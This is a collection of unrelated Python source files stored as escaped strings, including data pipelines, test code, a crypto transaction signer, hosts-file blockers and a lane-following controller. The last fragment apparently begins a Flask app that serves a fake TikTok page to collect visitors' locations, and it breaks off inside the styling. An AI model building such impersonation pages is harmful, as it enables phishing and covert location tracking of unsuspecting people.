\u5c06\u6587\u4ef6\u540d\u548c\u4e8c\u8fdb\u5236\u6570\u636e\u6dfb\u52a0\u5230\u63d2\u5165\u5217\u8868\r\n                insert_data.append((image_name, image_id, image_data))\r\n\r\n            except Exception as e:\r\n                print(f\"\u65e0\u6cd5\u5904\u7406\u6587\u4ef6 {image_name}: {e}\")\r\n                continue\r\n\r\n    # \u6279\u91cf\u63d2\u5165\u6570\u636e\r\n    if insert_data:\r\n        cursor.executemany(f\"INSERT INTO {table_name} (image_name, image_id, image_data) VALUES (%s, %s, %s)\", insert_data)\r\n        conn.commit()\r\n\r\n    # \u5173\u95ed\u8fde\u63a5\r\n    cursor.close()\r\n    conn.close()\r\n    print(f\"{len(insert_data)} \u5f20\u56fe\u7247\u5df2\u6210\u529f\u5b58\u50a8\u5230\u6570\u636e\u5e93\u3002\")\r\n\r\n\r\n# \u8c03\u7528\u6279\u91cf\u63d2\u5165\u51fd\u6570\r\nstore_images_to_db('halflengthV2', 'image/halflength')\r\n",
    "import pandas as pd\nfrom components.Clean_Data import Clean_Data\nfrom components.Data import Data\nfrom components.connector import load_csv_from_mongodb, save_files_to_mongodb\n\ndef main():\n    # File path to the dataset\n    \n\n    # Step 1: Load Data\n    print(\"Loading data...\")\n    file_data = load_csv_from_mongodb(\"weatherAUS.csv\")\n    if file_data is None:\n        print(\"Failed to load data. Exiting.\")\n        return\n    print(\"Data loaded successfully!\")\n    print(file_data.head())  # Preview the first few rows\n\n    # Step 2: Clean Data\n    print(\"\\nCleaning data...\")\n    cleaner = Clean_Data()\n    cleaner.file = file_data\n\n    # Drop duplicates\n    cleaner.Drop_Duplicates()\n    print(\"Duplicates dropped.\")\n\n    # Step 3: Separate Data into Train, Test, and Validation Sets\n    print(\"\\nSplitting data into train, test, and validation sets...\")\n    train_data, test_data, val_data = cleaner.Data_Seperator()\n    print(f\"Training data shape: {train_data.shape}\")\n    print(f\"Testing data shape: {test_data.shape}\")\n    print(f\"Validation data shape: {val_data.shape}\")\n\n    # Step 4: Fill Missing Values\n    print(\"\\nFilling missing values...\")\n    cleaner.Fill_Na()\n    print(\"Missing values filled.\")\n\n    # Step 5: Identify Numerical and Categorical Columnss\n    print(\"\\nIdentifying column types...\")\n    data_processor = Data()\n    numerical_cols, categorical_cols = data_processor.Columns()\n    print(f\"Numerical columns: {numerical_cols}\")\n    print(f\"Categorical columns: {categorical_cols}\")\n\n    # Step 6: Encode Categorical Data\n    '''print(\"\\nEncoding categorical data...\")\n    train_data, test_data, val_data = data_processor.Encoder(categorical_cols)'''\n\n    # Step 7: Normalize Numerical Data\n    print(\"\\nNormalizing numerical data...\")\n    normalized_train_data = data_processor.Normalizer(numerical_cols)\n    print(\"Numerical data normalized.\")\n\n    # Step 8: Save Processed Data (Optional)\n    print(\"\\nSaving processed data...\")\n    d={\"train\":train_data, \"test\":test_data, \"val\":val_data}\n    save_files_to_mongodb(d)\n    print(\"Processed data saved.\")\n\n    print(\"\\nAll steps completed successfully!\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "from selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options as ChromeOptions\nfrom selenium.webdriver.safari.options import Options as SafariOptions\nfrom selenium.webdriver.firefox.options import Options as FirefoxOptions\nimport json\n\n\nwith open('browserstack_config.json') as f:\n    config = json.load(f)\n\nusername = config['browserstack']['username']\naccess_key = config['browserstack']['access_key']\n\n\nbrowserstack_url = f\"https://{username}:{access_key}@hub-cloud.browserstack.com/wd/hub\"\n\n\nfor browser in config['browsers']:\n    if browser['browser'].lower() == 'chrome':\n        options = ChromeOptions()\n    elif browser['browser'].lower() == 'safari':\n        options = SafariOptions()\n    elif browser['browser'].lower() == 'firefox':\n        options = FirefoxOptions()\n    else:\n        print(f\"Unsupported browser: {browser['browser']}\")\n        continue\n\n    \n    for key, value in browser.items():\n        options.set_capability(key, value)\n\n    try:\n        driver = webdriver.Remote(\n            command_executor=browserstack_url,\n            options=options\n        )\n        driver.get('https://elpais.com/opinion/')\n        print(driver.title)\n        driver.quit()\n\n    except Exception as e:\n        print(f\"Error for {browser['browser']}: {str(e)}\")\n\n\n\n\n\n\n",
    "import dataclasses\n\nimport wadler_lindig as wl\nfrom wadler_lindig import BreakDoc as Brk, TextDoc as Txt\n\n\ndef test_lindig():\n    # From Section 2 of Lindig's paper.\n\n    doc = (\n        Txt(\"begin\")\n        + (\n            Brk(\" \")\n            + (Txt(\"stmt;\") + Brk(\" \") + Txt(\"stmt;\") + Brk(\" \") + Txt(\"stmt;\")).group()\n        ).nest(3)\n        + Brk(\" \")\n        + Txt(\"end\")\n    ).group()\n\n    out50 = wl.pformat(doc, width=50)\n    out25 = wl.pformat(doc, width=25)  # Lindig uses 30, but I think that's a mistake.\n    out10 = wl.pformat(doc, width=10)\n    assert out50 == \"begin stmt; stmt; stmt; end\"\n    assert (\n        out25\n        == \"\"\"begin\n   stmt; stmt; stmt;\nend\"\"\"\n    )\n    assert (\n        out10\n        == \"\"\"begin\n   stmt;\n   stmt;\n   stmt;\nend\"\"\"\n    )\n\n\ndef test_newlines_in_text():\n    class Foo:\n        def __pdoc__(self, **kwargs):\n            del kwargs\n            return wl.TextDoc(\"hello\\nthere\")\n\n    @dataclasses.dataclass\n    class Bar:\n        x: list[int | Foo]\n\n    bar = Bar(x=[Foo(), 3, Foo(), Foo()])\n\n    out = wl.pformat(bar, width=50)\n    expected_out = \"\"\"Bar(x=[hello\n       there, 3, hello\n                 there, hello\n                        there])\"\"\"\n    assert out == expected_out\n\n    out = wl.pformat(bar, width=1)\n    expected_out = \"\"\"Bar(\n  x=[\n    hello\n    there,\n    3,\n    hello\n    there,\n    hello\n    there\n  ]\n)\"\"\"\n    assert out == expected_out\n",
    "from dataclasses import dataclass\nfrom typing import Optional\nfrom eth_account import Account\nfrom web3 import Web3\n\n\n@dataclass\nclass Transaction:\n    \"\"\"Data class for transaction signing requests\"\"\"\n\n    to: str\n    value: int = 0\n    data: str = \"0x\"\n    nonce: Optional[int] = None\n    gas_price: Optional[int] = None\n    gas: Optional[int] = None\n\n\n@dataclass\nclass SignTransactionRequest:\n    \"\"\"Data class for transaction signing requests\"\"\"\n\n    rpc_url: str\n    transaction: dict\n\n    def __post_init__(self):\n        # Convert the transaction dict to Transaction object after initialization\n        if isinstance(self.transaction, dict):\n            self.transaction = Transaction(**self.transaction)\n\n\ndef sign_and_broadcast_eth_transaction(\n    tx: Transaction, private_key: str, rpc_url: str\n) -> dict:\n    \"\"\"Signs and broadcasts an Ethereum transaction using the TEE's private key\"\"\"\n    web3 = Web3(Web3.HTTPProvider(rpc_url))\n    account = Account.from_key(private_key)\n\n    balance = web3.eth.get_balance(account.address)\n    print(f\"Account balance: {web3.from_wei(balance, 'ether')} ETH\")\n    print(f\"Account address: {account.address}\")\n    print(f\"RPC: {rpc_url}\")\n\n    # Get chain ID from RPC\n    chain_id = web3.eth.chain_id\n\n    tx_dict = {\n        \"to\": tx.to,\n        \"value\": tx.value,\n        \"data\": tx.data,\n        \"chainId\": chain_id,\n        \"nonce\": (\n            tx.nonce\n            if tx.nonce is not None\n            else web3.eth.get_transaction_count(account.address)\n        ),\n        \"gasPrice\": (tx.gas_price if tx.gas_price is not None else web3.eth.gas_price),\n        \"gas\": (tx.gas if tx.gas is not None else 21000),  # Default gas limit\n    }\n\n    signed_tx = web3.eth.account.sign_transaction(tx_dict, account.key)\n    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)\n\n    return {\n        \"signed_transaction\": Web3.to_hex(signed_tx.raw_transaction),\n        \"transaction_hash\": Web3.to_hex(tx_hash),\n    }\n",
    "'''\ngenerate khmer text clusters where each cluster has a max of ONE (1) coeng sequence \n\nusage example:\n```python\n\nfrom kh_bbox_gen import KhmerTextClusterGenerator\nrenderer = KhmerTextRenderer(font_path=\"./Hanuman-Regular.ttf\", font_size=24)\ntest_text = \"\u179f\u17b6\u1793\u1780\u17c2\u179c\u1798\u1793\u17c4\u179a\u17b6\"\nclusters = renderer.render_text(test_text, \"khmer_text_with_boxes.png\")\n```\n\n'''\n\nfrom PIL import Image, ImageFont, ImageDraw, ImageEnhance, ImageFilter, ImageOps\nimport os \nimport unicodedata\nimport random\nimport numpy as np\nfrom tqdm import tqdm\nfrom typing import List, Dict, Tuple, Optional, Union\n\n\n\nclass KhmerTextClusterGenerator:\n    def __init__(self, font_path=\"Khmer.ttf\", font_size=48, background_images_dir: str = \"random_images\"):\n        self.font = ImageFont.truetype(font_path, font_size)\n        self.base_height = font_size\n        self.background_images_dir = background_images_dir\n        # Get standard character height using a tall character like \u1780\n        self.standard_height = (self.font.getbbox('\u1780')[3] - self.font.getbbox('\u1780')[1]) * 2\n        \n    def analyze_khmer_cluster(self, text):\n        \"\"\"\n        Analyze Khmer text to identify character clusters and their components.\n        A cluster includes a base character and all its dependent vowels, signs,\n        and subscript consonants.\n        \"\"\"\n        clusters = []\n        current_cluster = []\n        \n        i = 0\n        while i < len(text):\n            char = text[i]\n            if char == '\\u17AB':\n                # If there's an existing cluster, save it\n                if current_cluster:\n                    clusters.append(current_cluster)\n                # Create a new cluster with just this character\n                clusters.append([char])\n                current_cluster = []\n                i += 1\n                continue \n\n            # start a new cluster if we're at a base consonant\n            if not current_cluster or self.is_base_consonant(char):\n                if current_cluster:\n                    clusters.append(current_cluster)\n                current_cluster = [char]\n            else:\n                # add character to current cluster if it's a dependent sign\n                current_cluster.append(char)\n            \n            # special handling for coeng (\u17d2) sequences\n            if i + 1 < len(text) and text[i + 1] == '\\u17D2':  # COENG\n                # Include COENG and the following consonant in the current cluster\n                current_cluster.extend([text[i + 1], text[i + 2]])\n                i += 2  # Skip the next two characters as we've already processed them\n            i += 1\n        \n        # Add the last cluster if there is one\n        if current_cluster:\n            clusters.append(current_cluster)\n            \n        return clusters\n    \n    def is_base_consonant(self, char):\n        \"\"\"\n        Check if a character is a Khmer base consonant.\n        \"\"\"\n        # Khmer consonant range\n        return '\\u1780' <= char <= '\\u17A2'\n    \n    def is_vowel_sign(self, char):\n        \"\"\"\n        Check if a character is a Khmer vowel sign.\n        \"\"\"\n        # Khmer vowel sign range\n        return '\\u17B6' <= char <= '\\u17C5'\n\n    def calculate_cluster_height(self, cluster):\n        \"\"\"\n        Calculate the height for a cluster, including all adjustments.\n        \"\"\"\n        cluster_text = ''.join(cluster)\n        bbox = self.font.getbbox(cluster_text)\n        \n        # Start with standard height\n        height = max(self.standard_height, bbox[3] - bbox[1])\n        \n        # Adjust for clusters with COENG\n        if '\\u17D2' in cluster_text:\n            height += self.base_height * 0.3\n        \n        # Adjust for vowel signs\n        for char in cluster:\n            if self.is_vowel_sign(char):\n                height += self.base_height * 0.1\n                \n        return height\n\n    def get_char_bbox(self, cluster, x, y, max_height):\n        \"\"\"\n        Get the bounding box for a character cluster.\n        All boxes will have the same height as the tallest cluster.\n        \"\"\"\n        cluster_text = ''.join(cluster)\n        bbox = self.font.getbbox(cluster_text)\n        \n        # Base width from font metrics\n        width = bbox[2] - bbox[0]\n        \n        return (x + bbox[0], y, x + bbox[2], y + max_height)\n            \n    def add_noise(self, image: Image.Image, noise_factor: float = 0.1) -> Image.Image:\n        \"\"\"Add random noise to the image\"\"\"\n        img_array = np.array(image)\n        noise = np.random.normal(0, noise_factor * 255, img_array.shape)\n        noisy_img = np.clip(img_array + noise, 0, 255).astype(np.uint8)\n        return Image.fromarray(noisy_img)\n    \n    def apply_emboss(self, image: Image.Image, probability: float = 0.5):\n        if not 0 <= probability <= 1:\n            raise ValueError(\"Probability must be between 0 and 1.\")\n        apply = random.random() < probability\n        if apply:\n            return image.filter(ImageFilter.EMBOSS)\n        else:\n            return image \n    \n    def apply",
    "import time as t\nfrom datetime import datetime as d\nimport os as o\n\nB = [\n    'www.facebook.com',\n    'facebook.com',\n    'www.youtube.com',\n    'youtube.com',\n    'www.gmail.com',\n    'gmail.com',\n]\n\nSTART_H = 9\nEND_H = 21\n\nH_L = '/etc/hosts'\nH_W = r\"C:\\Windows\\System32\\drivers\\etc\\hosts\"\nH = H_L\nR = '127.0.0.1'\n\nif o.name == 'posix':\n    H = H_L\nelif o.name == 'nt':\n    H = H_W\nelse:\n    print(\"Unknown OS\")\n    o.sys.exit()\n\ndef manage_hosts(start, end):\n    while True:\n        try:\n            now = d.now()\n            S = d(now.year, now.month, now.day, start)\n            E = d(now.year, now.month, now.day, end)\n            if S < now < E:\n                print(\"Blocking active.\")\n                with open(H, 'r+') as f:\n                    content = f.read()\n                    for site in B:\n                        if site not in content:\n                            f.write(f\"{R} {site}\\n\")\n            else:\n                with open(H, 'r+') as f:\n                    lines = f.readlines()\n                    f.seek(0)\n                    for line in lines:\n                        if not any(site in line for site in B):\n                            f.write(line)\n                    f.truncate()\n                print(\"Access to sites is allowed.\")\n            t.sleep(3)\n        except PermissionError as e:\n            print(f\"Permission Error: Run script with administrator privileges. {e}\")\n            break\n\nif __name__ == '__main__':\n    manage_hosts(START_H, END_H)\n",
    "r\"\"\"\ndeidentification.py\n-John Taylor\n2024-12-31\n\nThis module provides text de-identification capabilities by removing personally identifiable\ninformation (PII) such as names and gender-specific pronouns from text documents. It uses\nspaCy's Named Entity Recognition (NER) for identifying person names and includes custom logic\nfor handling gender pronouns.\n\nThe deidentification process works through multiple passes to ensure thorough PII removal.\nIt first identifies all person entities using spaCy's NER, then locates gender-specific\npronouns. The critical innovation in this implementation is its backward-merging strategy:\nrather than processing the text from start to finish, it sorts all identified entities and\npronouns by their position and processes them from end to beginning. This backwards approach\nis optimal because string replacements can alter the character positions of subsequent\nentities when text lengths change. By working backwards, each replacement's character\npositions remain valid since they haven't been affected by previous replacements. The process\niteratively continues until no new person entities are detected, ensuring comprehensive\nde-identification even in cases where entity recognition might improve after initial\nreplacements. The module supports both plain text and HTML output formats, with the latter\nproviding visual highlighting of replacements through span tags.\n\"\"\"\n\nfrom dataclasses import dataclass, fields\nfrom io import StringIO\nfrom operator import itemgetter\nfrom typing import Any, BinaryIO, Optional, Union\nfrom .deidentification_constants import bcolors, GENDER_PRONOUNS, HTML_BEGIN, HTML_END\nfrom .deidentification_constants import pgmName, pgmUrl, pgmVersion, DeidentificationOutputStyle, DeidentificationLanguages\nfrom .normalize_punctuation import normalize_punctuation\nimport spacy\nfrom spacy.tokens import Doc\nimport sys\n\n@dataclass\nclass DeidentificationConfig:\n    spacy_load: bool = True\n    spacy_model: str = \"en_core_web_trf\"\n    output_style: DeidentificationOutputStyle = DeidentificationOutputStyle.TEXT\n    language: DeidentificationLanguages = DeidentificationLanguages.ENGLISH\n    replacement: str = DeidentificationLanguages.ENGLISH.value\n    debug: bool = False\n    save_tokens: bool = False\n    filename: Optional[str] = None\n    excluded_entities: set[str] = None\n\n    def __str__(self) -> str:\n        return \"\\n\".join(f\"- {field.name:<15} = {getattr(self, field.name)}\"\n                         for field in fields(self))\n\nclass Deidentification:\n    nlp: Optional[spacy.language.Language] = None\n\n    def __init__(self, config: DeidentificationConfig = DeidentificationConfig()):\n        \"\"\"Initialize the Deidentification instance.\n\n        Args:\n            config (DeidentificationConfig, optional): Configuration settings for the\n                de-identification process. Defaults to DeidentificationConfig().\n        \"\"\"\n        self.config = config\n        if self.config.excluded_entities is not None:\n            self.config.excluded_entities = {entity.lower() for entity in self.config.excluded_entities}\n\n        self.table_class  = None\n\n        if self.config.debug:\n            from veryprettytable import VeryPrettyTable\n            self.table_class = VeryPrettyTable\n\n        if self.config.spacy_load:\n            import torch\n            self.original_load = torch.load\n            torch.load = self.__safe_load\n            spacy.prefer_gpu()\n            if not Deidentification.nlp:\n                try:\n                    Deidentification.nlp = spacy.load(self.config.spacy_model)\n                except OSError as err:\n                    self.model_not_found_error(str(err))\n                except Exception as err:\n                    raise err\n\n    def _reset(self):\n        \"\"\"Resets all instance variables to their initial state.\n\n        Initializes or clears various tracking lists and document references used during\n        the deidentification process. This includes lists for storing person mentions,\n        pronouns, and the spaCy Doc object.\n\n        Attributes:\n            all_persons (list[dict]): Stores person entities found in current pass.\n            aggregate_persons (list[dict]): Accumulates person entities across multiple passes.\n            aggregate_pronouns (list[dict]): Accumulates pronouns across multiple deidentification iterations.\n            all_pronouns (list[dict]): Stores pronouns found in current pass.\n            doc (Optional[Doc]): Reference to the spaCy Doc object being processed.\n            replaced_text (Optional[str]): Stores the text after replacement operations.\n        \"\"\"\n        self.all_persons: list[dict] = []\n\n        # this combines all self.all_persons lists from multiple passes of self._find_all_persons()\n        self.aggregate_persons: list[dict] = []\n\n        # this combines all self.all_pronouns lists from multiple loop iterations in self.deidentify()\n        self.aggregate_pronouns: list[dict] = []\n\n        self.all_prono",
    "from flask import Blueprint, request, jsonify\nimport logging\nfrom app.models import db, Favourite\nfrom flask_login import current_user,login_required\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nfavourite = Blueprint(\"favourite\", __name__)\n\n@login_required\n@favourite.get('/api/v1/favourites')\ndef list_favourites():\n    \"\"\"\n    List all favourites.\n    ---\n    tags:\n        - Favourite\n    get:\n        description: Retrieve a list of all favourites (either podcast or episode).\n        responses:\n            200:\n                description: A list of all favourites.\n                schema:\n                    type: array\n                    items:\n                        $ref: '#/definitions/Favourite'\n    \"\"\"\n    if not current_user.is_authenticated:\n        return jsonify({'status': 'error', 'message': 'User not authenticated'}), 403\n\n    favourite_list: list[Favourite] = Favourite.query.filter_by(user_id=current_user.id).all()\n    favourite_list_dict = [item.to_dict() for item in favourite_list]\n    return jsonify({'status': 'success', 'message': 'got downloads', 'data': favourite_list_dict}), 201\n\n@login_required\n@favourite.get('/api/v1/favourites/podcast')\ndef favourites_podcast_count():\n    data = request.json\n    podcast_id = data.get('podcast_id')\n    try:\n        count = 0\n        favourite_list = Favourite.query.filter_by(podcast_id=podcast_id).all()\n        count = len(favourite_list)\n        return jsonify({'status': 'success', 'message': 'Retrieved number of likes', 'data': count}), 200\n    except Exception as e:\n        logger.error(f\"Error retrieving numeber of likes: {str(e)}\")\n        return jsonify(\n            {'status': 'error', 'message': 'Failed to retrieve number of likes', 'error_code': 'SERVER_ERROR',\n             'data': None}), 500\n\n@login_required\n@favourite.post('/api/v1/favourites')\ndef add_podcast_to_favourite():\n    \"\"\"\n    Add a podcast or episode to favourites.\n    ---\n    tags:\n        - Favourite\n    post:\n        description: Add a podcast or episode to the user's favourites.\n        parameters:\n            - name: user_id\n              in: body\n              type: integer\n              description: ID of the user.\n              required: true\n            - name: podcast_id\n              in: body\n              type: integer\n              description: ID of the podcast (optional, either podcast_id or episode_id should be provided).\n              required: false\n            - name: episode_id\n              in: body\n              type: integer\n              description: ID of the episode (optional, either podcast_id or episode_id should be provided).\n              required: false\n        responses:\n            200:\n                description: Successfully added to favourites.\n            400:\n                description: Missing required fields or invalid data.\n    \"\"\"\n    data = request.json\n    podcast_id = data.get('podcast_id')\n    episode_id = data.get('episode_id')\n\n    try:\n        new_favourite = Favourite(user_id=current_user.id, podcast_id=podcast_id, episode_id=episode_id)\n        db.session.add(new_favourite)\n        db.session.commit()\n        return jsonify({'status': 'success', 'message': 'added to favourite', 'data': None}), 201\n    except Exception as e:\n        db.session.rollback()\n        logger.error(str(e))\n        return jsonify({'status': 'error', 'message': 'favourite action failed', 'error_code': 'SERVER ERROR',\n                        'data': None}), 500\n\n@login_required\n@favourite.delete('/api/v1/favourites')\ndef remove_from_favourite():\n    \"\"\"\n    Remove a podcast or episode from favourites.\n    ---\n    tags:\n        - Favourite\n    delete:\n        description: Remove a podcast or episode from the user's favourites.\n        parameters:\n            - name: user_id\n              in: body\n              type: integer\n              description: ID of the user.\n              required: true\n            - name: podcast_id\n              in: body\n              type: integer\n              description: ID of the podcast (optional, either podcast_id or episode_id should be provided).\n              required: false\n            - name: episode_id\n              in: body\n              type: integer\n              description: ID of the episode (optional, either podcast_id or episode_id should be provided).\n              required: false\n        responses:\n            200:\n                description: Successfully removed from favourites.\n            404:\n                description: Favourite not found.\n    \"\"\"\n    data = request.json\n    podcast_id = data.get('podcast_id')\n    episode_id = data.get('episode_id')\n\n    try:\n        favourite_ = None\n        if podcast_id:\n            favourite_ = Favourite.query.filter_by(user_id=current_user.id, podcast_id=podcast_id).first()\n        elif episode_id:\n            favourite_ = Favourite.query.filter_by(user_id=current_user.id, episode_id=episode_id).first()\n\n        if favourite_:\n  ",
    "import requests\nimport os\nimport ctypes\n\ndef is_admin():\n\ttry:\n\t\treturn ctypes.windll.shell32.IsUserAnAdmin()\n\texcept:\n\t\treturn False\n\nif not is_admin():\n\tprint(\"Please run this script as administrator\")\n\tinput(\"Press enter to exit...\")\n\texit()\n\nurl = \"https://adobe.isdumb.one/list.txt\"\nresponse = requests.get(url)\n\nhost = []\ntry:\n\tif response.status_code == 200:\n\t\tprint(\"Successfully downloaded the list\")\n\t\twith open(\"list.txt\", \"w\") as file:\n\t\t\tfor line in response.text.split(\"\\n\"):\n\t\t\t\tif not line.startswith(\"#\"):\n\t\t\t\t\thost.append(line)\n\telse:\n\t\tprint(\"Failed to download the list from original, trying other mirror\")\n\t\turl_mirror = ['https://fastly.jsdelivr.net/gh/ignaciocastro/a-dove-is-dumb@latest/list.txt','https://gcore.jsdelivr.net/gh/ignaciocastro/a-dove-is-dumb@latest/list.txt','https://quantil.jsdelivr.net/gh/ignaciocastro/a-dove-is-dumb@latest/list.txt','https://gh-proxy.com/https://raw.githubusercontent.com/ignaciocastro/a-dove-is-dumb/main/list.txt']\n\t\tfor i in range(len(url_mirror)):\n\t\t\tresponse_mirror = requests.get(url_mirror)\n\t\t\tif response_mirror.status_code == 200:\n\t\t\t\tbreak\n\t\tif response_mirror.status_code == 200:\n\t\t\tprint(\"Successfully downloaded the list from mirror\")\n\t\t\twith open(\"list.txt\", \"w\") as file:\n\t\t\t\tfor line in response_mirror.text.split(\"\\n\"):\n\t\t\t\t\tif not line.startswith(\"#\"):\n\t\t\t\t\t\thost.append(line)\nexcept Exception as e:\n\tprint(f\"An error occurred: {e}\")\n\tprint(\"Exiting...\")\n\texit()\n\nwith open('C:\\\\Windows\\\\System32\\\\Drivers\\\\etc\\\\hosts', \"r+\") as f:\n\tcontent = f.read()\n\tfor line in host:\n\t\tif line not in content:\n\t\t\tf.write(\"\\n\" + line)\nprint(\"Successfully added the list to the hosts file\")\ninput(\"Press enter to exit...\")\n",
    "import os\nimport cv2\nimport numpy as np\nfrom vehicle import Driver  # Webots\nfrom controller import Supervisor\nimport random  # To simulate random steering adjustments\nimport gym\nfrom gym import Env\nfrom gym.spaces import Box\nimport numpy as np\nfrom stable_baselines3 import PPO\nfrom stable_baselines3.common.env_util import make_vec_env\nimport time\nfrom stable_baselines3.common.torch_layers import BaseFeaturesExtractor\nfrom torch import nn\nimport torch\n\n# Settings\nIMAGE_HEIGHT = 200\nIMAGE_WIDTH = 500\nMAX_STEERING_ANGLE = 0.8  # Maximum allowable steering angle\nMAX_SPEED = 20.0\nt1 = 0\n\n# Just for handling an error\nos.environ[\"KMP_DUPLICATE_LIB_OK\"] = \"TRUE\"\n\n\ndef make_dots(image,line):\n    # print (line)\n    # line[np.isnan(line)==True]=random.randint(0,2)\n    slope,intercept=line\n    y1=image.shape[0]\n    y2=int(y1*(2/5))\n    x1=int((y1-intercept)/slope)\n    x2=int((y2-intercept)/slope)\n    return np.array([x1,y1,x2,y2])\n        # return np.array([0,0,1,1])\n\n\ndef line_av(image,lines):\n    black=np.zeros_like(image)\n    left_side=[]\n    right_side=[]\n\n    try:\n        for line in lines:\n            croods=line[0]\n            parameters=np.polyfit((croods[0],croods[2]),(croods[1],croods[3]),1)\n            slope=parameters[0]\n            intercept=parameters[1]\n            if slope<0:\n                left_side.append((slope,intercept))\n            else:\n                right_side.append((slope,intercept))\n            \n        if len(left_side)!=0 and len(right_side)!=0:\n            # left\n            left_fit_av=np.average(left_side,axis=0)\n            left_dots=make_dots(image,left_fit_av)\n            left_coords = left_dots\n            cv2.line(black, (left_coords[0], left_coords[1]), (left_coords[2], left_coords[3]), [0,255,0], 2)\n            # print(1/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))-1.6 , (199-left_coords[1])/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))+left_coords[0]-152)\n            distance_left = (199-left_coords[1])/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))+left_coords[0]\n            # right\n            right_fit_av=np.average(right_side,axis=0)\n            right_dots=make_dots(image,right_fit_av)\n            right_coords = right_dots\n            cv2.line(black, (right_coords[0], right_coords[1]), (right_coords[2], right_coords[3]), [0,255,0], 2)\n            # print(1/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+1.6 , (199-right_coords[1])/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+right_coords[0]+152)\n            distance_right = (199-right_coords[1])/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+right_coords[0]\n        elif len(left_side)!=0:\n            distance_right = 0\n            left_fit_av=np.average(left_side,axis=0)\n            left_dots=make_dots(image,left_fit_av)\n            left_coords = left_dots\n            cv2.line(black, (left_coords[0], left_coords[1]), (left_coords[2], left_coords[3]), [0,255,0], 2)\n            # print(1/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))-1.6 , (199-left_coords[1])/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))+left_coords[0]-152)\n            distance_left = (199-left_coords[1])/((left_coords[3]-left_coords[1])/(left_coords[2]-left_coords[0]))+left_coords[0]\n        elif len(right_side)!=0:\n            distance_left = 0\n            right_fit_av=np.average(right_side,axis=0)\n            right_dots=make_dots(image,right_fit_av)\n            right_coords = right_dots\n            cv2.line(black, (right_coords[0], right_coords[1]), (right_coords[2], right_coords[3]), [0,255,0], 2)\n            # print(1/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+1.6 , (199-right_coords[1])/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+right_coords[0]+152)\n            distance_right = (199-right_coords[1])/((right_coords[3]-right_coords[1])/(right_coords[2]-right_coords[0]))+right_coords[0]\n        else:\n            distance_right = 0\n            distance_left = 0\n    except:\n        distance_right = 0\n        distance_left = 0\n\n    return black,distance_left,distance_right\n\n\ndef line_analysis(image,left_line,right_line):\n    if left_line != 0 and right_line != 0 :\n        distance = image.shape[1]//2 - (left_line + right_line)//2\n        # print(image.shape[1]//2 - (left_line + 160),image.shape[1]//2 - (right_line - 160))\n    elif left_line != 0:\n        distance = image.shape[1]//2 - (left_line + 160)\n    elif right_line != 0:\n        distance = image.shape[1]//2 - (right_line - 160)\n    else:\n        distance = 0\n\n    return distance\n\n\ndef make_canny(image_copy_func):\n    image_gray=cv2.cvtColor(image_copy_func,cv2.COLOR_BGR2GRAY)\n    image_blur=cv2.GaussianBlur(image_gray,(5,5),0)\n    canny=cv2.Canny(image_blur,50,100)\n    return canny\n\n\ndef region_interest(image):\n    heigh=image.shape[0]\n    triangel=np.array([[(29,199),(470,199),(3",
    "from transformers import RobertaTokenizer, Trainer\nimport torch\nfrom torch import nn\n\nfrom dataset import parse_dataset, get_classes, Tier3Dataset\nfrom trainer_utils import compute_metrics, get_mask_matrix, HierarchicalDataCollator\nfrom model import HierarchicalBERT\n\ndef main():\n    test_set = parse_dataset('/data/BlurbGenreCollection_EN_test.txt')\n    \n    classes, class_to_idx, idx_to_class, taxonomy = get_classes(test_set)\n\n    mask_mat_t2 = get_mask_matrix(taxonomy['tier1'], class_to_idx['tier1'], class_to_idx['tier2'])\n    mask_mat_t3 = get_mask_matrix(taxonomy['tier1'], class_to_idx['tier2'], class_to_idx['tier3'])\n\n    model = HierarchicalBERT.from_pretrained('model',\n                                             num_labels = len(classes['tier1']),\n                                             num_tier2 = len(classes['tier2']),\n                                             num_tier3 = len(classes['tier3']),\n                                             mask_tier2 = mask_mat_t2,\n                                             mask_tier3 = mask_mat_t3)\n    \n    tokenizer = RobertaTokenizer.from_pretrained(\"FacebookAI/roberta-base\")\n\n    test_dataset = Tier3Dataset(test_set['description'], test_set['tier1'], test_set['tier2'], test_set['tier3'], tokenizer)\n\n    data_collator = HierarchicalDataCollator(tokenizer)\n\n    tester = Trainer(\n    model = model,\n    data_collator = data_collator,\n    compute_metrics = compute_metrics\n    )\n\n    tester.evaluate(test_dataset)\n\nif __name__==\"__main__\":\n    main()",
    "from flask import Flask, request, render_template_string, redirect, make_response\nimport folium\nimport json\nimport os\nfrom datetime import datetime\nimport webbrowser\nimport subprocess\nimport time\nimport threading\nimport requests\n\napp = Flask(__name__)\n\n# Store the latest location\nlatest_location = None\nlocation_file = \"location_data.json\"\n\n# HTML template for TikTok page\nFACEBOOK_PAGE = \"\"\"\n<!DOCTYPE html>\n<html>\n<head>\n    <title>TikTok - Make Your Day</title>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <link rel=\"icon\" href=\"https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/favicon-32x32-8753c448f00ef47e714124c2c1f77002.png\">\n    <style>\n        body {\n            margin: 0;\n            padding: 0;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial;\n            background-color: black;\n            color: white;\n        }\n        .container {\n            max-width: 500px;\n            margin: 0 auto;\n            padding: 20px;\n        }\n        .video-container {\n            position: relative;\n            width: 100%;\n            padding-bottom: 177.78%; /* 16:9 Aspect Ratio */\n            background-color: #121212;\n            border-radius: 8px;\n            overflow: hidden;\n        }\n        .video-placeholder {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            background: 